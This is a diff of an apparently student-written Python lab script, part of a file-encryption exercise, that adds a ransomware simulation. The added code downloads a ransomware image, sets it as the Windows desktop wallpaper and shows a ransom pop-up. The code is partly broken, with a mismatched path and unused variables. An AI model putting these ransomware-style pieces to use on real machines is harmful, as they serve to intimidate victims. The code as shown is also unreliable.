@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
-import os, urllib.request, ctypes
+import os
+import urllib.request
+import ctypes
 from cryptography.fernet import Fernet
+from tkinter import messagebox
 
 
 # Script Name:                  File Encryption Script Part 3 of 3
@@ -81,18 +84,18 @@ def decrypt_folder(key, input_folder, output_folder):
 
 
 
-# Alter desktop wallpaper with ransomeware 
-def desktop_wallpaper(https://www.secpod.com/blog/wp-content/uploads/2017/05/Screenshot-from-2017-05-14-23-42-20.png):
+# Alter desktop wallpaper with ransomeware image
+def desktop_wallpaper(image_ransome, message_ransome):
+    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
     # Download image and save it to the desktop folder
-    path = '/home/ns/CodeFellows-Ops-401d-Labs-2'
-    urllib.request.urlretrieve(image_url, path)
-
+    path = '/home/ns/CodeFellows-Ops-401d-Labs-2' 
+    urllib.request.urlretrieve(image_ransome, path)
     # Change the desktop wallpaper using Windows API
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
-
-
 # popup window with ransomware message
+    messagebox.showinfo("This is the ransomeware pop-up window, /n In order to decrypt follow the instruction... (pending) ", message_ransome)
+
 # Menu prompt, add this as a ransomware simulation option.
 
 
